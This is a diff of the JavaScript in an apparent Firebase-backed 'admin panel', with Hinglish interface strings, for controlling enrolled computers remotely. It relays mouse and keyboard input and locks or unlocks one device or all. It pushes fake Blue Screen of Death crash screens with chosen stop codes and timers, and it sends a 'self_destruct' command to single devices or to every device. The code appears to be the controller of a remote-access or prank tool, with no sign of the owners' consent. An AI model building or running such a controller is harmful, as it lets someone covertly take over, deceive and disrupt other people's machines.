-  ctrl({type:"mouse_scroll", delta: e.deltaY<0?3:-3});
-},{passive:false});
-
-// ── Keyboard ──────────────────────────────────────────────
-const skipIds=["kb","qid","qmsg"];
-document.addEventListener("keydown", e=>{
-  if(skipIds.includes(document.activeElement?.id)) return;
-  if(!viewingDevice) return;
-  e.preventDefault();
-  const key=e.key.toLowerCase()
-    .replace("arrowleft","left").replace("arrowright","right")
-    .replace("arrowup","up").replace("arrowdown","down")
-    .replace(" ","space");
-  ctrl({type:"key_press",key,ctrl:e.ctrlKey,alt:e.altKey,shift:e.shiftKey,meta:e.metaKey});
-});
-
-document.getElementById("kb").addEventListener("keydown",e=>{
-  if(e.key==="Enter"){window.sendText();e.preventDefault();}
-});
-
-window.sendText=()=>{
-  const t=document.getElementById("kb").value.trim();
-  if(!t) return;
-  ctrl({type:"type_text",text:t});
-  document.getElementById("kb").value="";
-  log(`Typed: "${t}"`,"ok");
-};
-
-window.rKey=(key,...mods)=>{
-  ctrl({type:"key_press",key,ctrl:mods.includes("ctrl"),alt:mods.includes("alt"),shift:mods.includes("shift"),meta:mods.includes("win")});
-  log(`Key: ${[...mods,key].join("+")}`.replace(/^[+]/,""),"ok");
-};
-
-window.setMode=m=>{
-  mode=m;
-  ["move","click","drag"].forEach(id=>document.getElementById("mb-"+id)?.classList.toggle("on",id===m));
-};
-
-// ── Firebase lock/unlock ───────────────────────────────────
-function sendCmd(deviceId,action,message="🔒 Screen Locked",subMsg="Administrator ne lock kiya"){
-  set(ref(db,`commands/${deviceId}`),{
-    action,message,sub_message:subMsg,
-    color:action==="lock"?"#ff4444":"#00ff88",
-    timestamp:new Date().toISOString()
-  }).then(()=>{ log(`${action} → ${deviceId}`,"ok"); toast(`${action.toUpperCase()} → ${deviceId}`); })
-    .catch(e=>{ log("Err: "+e.message,"er"); toast(e.message,false,true); });
+function moveCRing(e) {
+  const r = scr.getBoundingClientRect();
+  cring.style.left = (e.clientX - r.left) + "px";
+  cring.style.top  = (e.clientY - r.top)  + "px";
 }
 
-window._lock   = id=>sendCmd(id,"lock");
-window._unlock = id=>sendCmd(id,"unlock");
-window.qLock   = ()=>{
-  const id=document.getElementById("qid").value.trim(), msg=document.getElementById("qmsg").value.trim();
-  if(!id){toast("Device ID daalo!",false,true);return;}
-  sendCmd(id,"lock",msg||"🔒 Screen Locked");
-};
-window.qUnlock = ()=>{
-  const id=document.getElementById("qid").value.trim();
-  if(!id){toast("Device ID daalo!",false,true);return;}
-  sendCmd(id,"unlock");
-};
-window.lockAll = async()=>{
-  const s=await get(ref(db,"devices"));
-  Object.keys(s.val()||{}).forEach(id=>sendCmd(id,"lock"));
-};
-window.unlockAll = async()=>{
-  const s=await get(ref(db,"devices"));
-  Object.keys(s.val()||{}).forEach(id=>sendCmd(id,"unlock"));
-};
+scr.addEventListener("mouseenter", () => { cring.style.display = "block"; });
+scr.addEventListener("mouseleave", () => { cring.style.display = "none";  });
 
-// ── Log + Toast ───────────────────────────────────────────
-function log(msg,type="in"){
-  const b=document.getElementById("log");
-  const t=new Date().toLocaleTimeString("en-IN",{hour12:false});
-  const el=document.createElement("div");
-  el.className="le";
-  el.innerHTML=`<span class="lt">${t}</span><span class="lm ${type}">${msg}</span>`;
-  b.prepend(el);
-  if(b.children.length>80) b.lastChild.remove();
+scr.addEventListener("mousemove", e => {
+  moveCRing(e);
+  if (!viewingDevice) return;
+  const { x, y } = getRelPos(e);
+  if (mode === "move") ctrl({ type: "mouse_move", x, y });
+  if (mode === "drag" && _isDragging) ctrl({ type: "mouse_move", x, y });
+});
+
+scr.addEventListener("mousedown", e => {
+  if (!viewingDevice) return;
+  const { x, y } = getRelPos(e);
+  const btn = e.button === 2 ? "right" : e.button === 1 ? "middle" : "left";
+  if (mode === "drag") {
+    _isDragging = true;
+    ctrl({ type: "mouse_down", x, y, button: btn });
+  }
+});
+
+scr.addEventListener("mouseup", e => {
+  if (!viewingDevice) return;
+  const { x, y } = getRelPos(e);
+  const btn = e.button === 2 ? "right" : e.button === 1 ? "middle" : "left";
+  if (mode === "drag" && _isDragging) {
+    _isDragging = false;
+    ctrl({ type: "mouse_up", x, y, button: btn });
+  } else if (mode === "click") {
+    ctrl({ type: "mouse_click", x, y, button: btn, double: false });
+  }
+});
+
+scr.addEventListener("dblclick", e => {
+  if (!viewingDevice || mode !== "click") return;
+  const { x, y } = getRelPos(e);
+  ctrl({ type: "mouse_click", x, y, button: "left", double: true });
+});
+
+scr.addEventListener("wheel", e => {
+  if (!viewingDevice) return;
+  ctrl({ type: "mouse_scroll", delta: e.deltaY > 0 ? -3 : 3 });
+}, { passive: true });
+
+scr.addEventListener("contextmenu", e => e.preventDefault());
+
+function ctrl(obj) {
+  if (!viewingDevice) return;
+  set(ref(db, `control/${viewingDevice}`), { ...obj, ts: Date.now() });
 }
-window.clearLog=()=>{document.getElementById("log").innerHTML="";};
+window.ctrl = ctrl;
 
-let _tt;
-function toast(msg,good=true,err=false){
-  const el=document.getElementById("toast");
-  el.textContent=msg;
-  el.className="show"+(err?" err":"");
-  clearTimeout(_tt);
-  _tt=setTimeout(()=>el.classList.remove("show"),2600);
+// ── Text + Keys ───────────────────────────────────────────────
+window.sendText = () => {
+  const t = document.getElementById("kb").value.trim();
+  if (!t) return;
+  ctrl({ type: "type_text", text: t });
+  document.getElementById("kb").value = "";
+  log(`Typed: "${t}"`, "ok");
+};
+
+document.getElementById("kb").addEventListener("keydown", e => {
+  if (e.key === "Enter") window.sendText();
+});
+
+window.rKey = (key, ...mods) => {
+  ctrl({
+    type: "key_press", key,
+    ctrl:  mods.includes("ctrl"),
+    alt:   mods.includes("alt"),
+    shift: mods.includes("shift"),
+    meta:  mods.includes("win"),
+  });
+  log(`Key: ${[...mods, key].join("+").replace(/^\+/, "")}`, "ok");
+};
+
+window.setMode = m => {
+  mode = m;
+  ["move","click","drag"].forEach(id =>
+    document.getElementById("mb-" + id)?.classList.toggle("on", id === m));
+};
+
+// ── Lock / Unlock ─────────────────────────────────────────────
+function sendCmd(deviceId, action, message = "🔒 Screen Locked", subMsg = "Administrator ne lock kiya") {
+  set(ref(db, `commands/${deviceId}`), {
+    action, message, sub_message: subMsg,
+    color: action === "lock" ? "#ff3b5c" : "#00e5ff",
+    timestamp: new Date().toISOString()
+  }).then(() => {
+    log(`${action} → ${deviceId}`, action === "lock" ? "er" : "ok");
+    toast(`${action.toUpperCase()} → ${deviceId}`, action !== "lock");
+  }).catch(e => { log("Err: " + e.message, "er"); toast(e.message, false, true); });
 }
 
+window._lock   = id => sendCmd(id, "lock");
+window._unlock = id => sendCmd(id, "unlock");
 
-// ── BSOD ──────────────────────────────────────────────────
-function getBSODParams() {
+window.qLock = () => {
+  const id  = document.getElementById("qid").value.trim()  || viewingDevice;
+  const msg = document.getElementById("qmsg").value.trim();
+  if (!id) { toast("Device ID daalo!", false, true); return; }
+  sendCmd(id, "lock", msg || "🔒 Screen Locked");
+};
+
+window.qUnlock = () => {
+  const id = document.getElementById("qid").value.trim() || viewingDevice;
+  if (!id) { toast("Device ID daalo!", false, true); return; }
+  sendCmd(id, "unlock");
+};
+
+window.lockAll = async () => {
+  const s = await get(ref(db, "devices"));
+  Object.keys(s.val() || {}).forEach(id => sendCmd(id, "lock"));
+};
+window.unlockAll = async () => {
+  const s = await get(ref(db, "devices"));
+  Object.keys(s.val() || {}).forEach(id => sendCmd(id, "unlock"));
+};
+
+// ── BSOD ─────────────────────────────────────────────────────
+function getBSOD() {
   return {
     stopcode:   document.getElementById("bsod-stopcode").value || null,
     phase1_sec: parseInt(document.getElementById("bsod-p1").value) || 300,
@@ -839,81 +1223,70 @@ function getBSODParams() {
   };
 }
 
-function sendBSOD() {
-  if (!viewingDevice) { toast("Device select karo pehle!", false, true); return; }
-  const p = getBSODParams();
+window.sendBSOD = () => {
+  if (!viewingDevice) { toast("Device select karo!", false, true); return; }
+  const p = getBSOD();
   set(ref(db, `commands/${viewingDevice}`), {
-    action:     "bsod",
-    phase1_sec: p.phase1_sec,
-    phase2_sec: p.phase2_sec,
-    stopcode:   p.stopcode,
-    timestamp:  new Date().toISOString()
+    action: "bsod", ...p, timestamp: new Date().toISOString()
   }).then(() => {
-    log(`💀 BSOD → ${viewingDevice} | ${p.stopcode||"random"} | ${p.phase1_sec}s+${p.phase2_sec}s`, "er");
+    log(`💀 BSOD → ${viewingDevice} | ${p.stopcode || "rnd"} | ${p.phase1_sec}+${p.phase2_sec}s`, "er");
     toast(`💀 BSOD → ${viewingDevice}`);
-  }).catch(e => { log("BSOD err: "+e.message,"er"); toast(e.message,false,true); });
-}
+  }).catch(e => log("BSOD err: " + e.message, "er"));
+};
 
-async function sendBSODAll() {
+window.sendBSODAll = async () => {
   const snap = await get(ref(db, "devices"));
   const ids  = Object.keys(snap.val() || {});
   if (!ids.length) { toast("Koi device nahi!", false, true); return; }
-  const p = getBSODParams();
+  const p = getBSOD();
   for (const id of ids) {
     await set(ref(db, `commands/${id}`), {
-      action:     "bsod",
-      phase1_sec: p.phase1_sec,
-      phase2_sec: p.phase2_sec,
-      stopcode:   p.stopcode,
-      timestamp:  new Date().toISOString()
+      action: "bsod", ...p, timestamp: new Date().toISOString()
     });
   }
   log(`💀 BSOD ALL → ${ids.length} devices`, "er");
   toast(`💀 BSOD → ${ids.length} devices`);
-}
+};
 
-window.sendBSOD    = sendBSOD;
-window.sendBSODAll = sendBSODAll;
-
-// ── Self Destruct ─────────────────────────────────────────
-let _destructTarget = null;   // null = single device, "ALL" = sabhi
+// ── Self Destruct ─────────────────────────────────────────────
+let _destructTarget = null;
 let _cdTimer        = null;
 
-function openDestructModal(targetId) {
+window.openDestructModal = targetId => {
   _destructTarget = targetId || viewingDevice;
-  if (!_destructTarget) { toast("Device select karo pehle!", false, true); return; }
+  if (!_destructTarget) { toast("Device select karo!", false, true); return; }
   document.getElementById("modal-target-id").textContent =
     _destructTarget === "ALL" ? "⚠ ALL DEVICES" : `Device: ${_destructTarget}`;
   document.getElementById("destructModal").classList.add("show");
   startCountdown();
-}
+};
 
-function openDestructAllModal() {
+window.openDestructAllModal = () => {
   _destructTarget = "ALL";
-  document.getElementById("modal-target-id").textContent = "⚠ SABHI DEVICES — " +
-    Object.keys(devData).join(", ");
+  document.getElementById("modal-target-id").textContent =
+    "⚠ SABHI DEVICES — " + Object.keys(devData).join(", ");
   document.getElementById("destructModal").classList.add("show");
   startCountdown();
-}
+};
 
-function closeDestructModal() {
+window.closeDestructModal = () => {
   clearInterval(_cdTimer);
   document.getElementById("destructModal").classList.remove("show");
   const btn = document.getElementById("confirmBtn");
-  btn.disabled = true;
+  btn.disabled    = true;
   btn.textContent = "☢ CONFIRM";
   document.getElementById("cdRing").textContent = "5";
+  document.getElementById("cdRing").style.borderTopColor = "";
   _destructTarget = null;
-}
+};
 
 function startCountdown() {
   let sec = 5;
   const ring = document.getElementById("cdRing");
   const btn  = document.getElementById("confirmBtn");
-  btn.disabled = true;
+  btn.disabled    = true;
   btn.textContent = `☢ CONFIRM (${sec}s)`;
   ring.textContent = sec;
-
   clearInterval(_cdTimer);
   _cdTimer = setInterval(() => {
     sec--;
@@ -922,27 +1295,26 @@ function startCountdown() {
     if (sec <= 0) {
       clearInterval(_cdTimer);
       btn.disabled = false;
-      ring.style.borderTopColor = "#ff3355";
+      ring.style.borderTopColor = "var(--red)";
+      ring.style.animation = "none";
     }
   }, 1000);
 }
 
-async function confirmDestruct() {
+window.confirmDestruct = async () => {
   closeDestructModal();
   if (_destructTarget === "ALL") {
     const snap = await get(ref(db, "devices"));
     const ids  = Object.keys(snap.val() || {});
-    for (const id of ids) {
-      await sendDestructCmd(id);
-    }
-    log(`☢ SELF DESTRUCT sent → ALL (${ids.length} devices)`, "er");
-    toast(`☢ DESTRUCT → ALL ${ids.length} devices`, false, true);
+    for (const id of ids) await sendDestructCmd(id);
+    log(`☢ DESTRUCT ALL → ${ids.length} devices`, "er");
+    toast(`☢ DESTRUCT ALL`, false, true);
   } else {
     await sendDestructCmd(_destructTarget);
-    log(`☢ SELF DESTRUCT sent → ${_destructTarget}`, "er");
+    log(`☢ DESTRUCT → ${_destructTarget}`, "er");
     toast(`☢ DESTRUCT → ${_destructTarget}`, false, true);
   }
-}
+};
 
 async function sendDestructCmd(deviceId) {
   try {
@@ -950,32 +1322,47 @@ async function sendDestructCmd(deviceId) {
       action: "self_destruct",
       timestamp: new Date().toISOString()
     });
-    log(`☢ Destruct command → ${deviceId}`, "er");
   } catch(e) {
     log(`Destruct err (${deviceId}): ${e.message}`, "er");
   }
 }
 
-// ESC se modal close karo
+// Keyboard ESC closes modal
 document.addEventListener("keydown", e => {
   if (e.key === "Escape" &&
-      document.getElementById("destructModal").classList.contains("show")) {
-    closeDestructModal();
-  }
+      document.getElementById("destructModal").classList.contains("show"))
+    window.closeDestructModal();
 });
-
-// Modal background click se close
 document.getElementById("destructModal").addEventListener("click", e => {
-  if (e.target === document.getElementById("destructModal")) closeDestructModal();
+  if (e.target === document.getElementById("destructModal"))
+    window.closeDestructModal();
 });
 
-// expose for inline onclick
-window.openDestructModal  = openDestructModal;
-window.openDestructAllModal = openDestructAllModal;
-window.closeDestructModal = closeDestructModal;
-window.confirmDestruct    = confirmDestruct;
+// ── Log + Toast ───────────────────────────────────────────────
+function log(msg, type = "dim") {
+  const b  = document.getElementById("log");
+  const t  = new Date().toLocaleTimeString("en-IN", { hour12: false });
+  const el = document.createElement("div");
+  el.className = "log-entry";
+  el.innerHTML = `<span class="log-time">${t}</span><span class="log-msg ${type}">${msg}</span>`;
+  b.prepend(el);
+  if (b.children.length > 100) b.lastChild.remove();
+}
+window.clearLog = () => { document.getElementById("log").innerHTML = ""; };
+window.log = log;
 
-log("Admin panel ready — Firebase stream mode","ok");
+let _tt;
+function toast(msg, good = true, err = false) {
+  const el = document.getElementById("toast");
+  el.textContent = msg;
+  el.className   = "show" + (err ? " err" : "");
+  clearTimeout(_tt);
+  _tt = setTimeout(() => el.classList.remove("show"), 2800);
+}
+window.toast = toast;
+
+log("Admin panel v12.0 ready", "ok");
 </script>
+
 </body>
 </html>
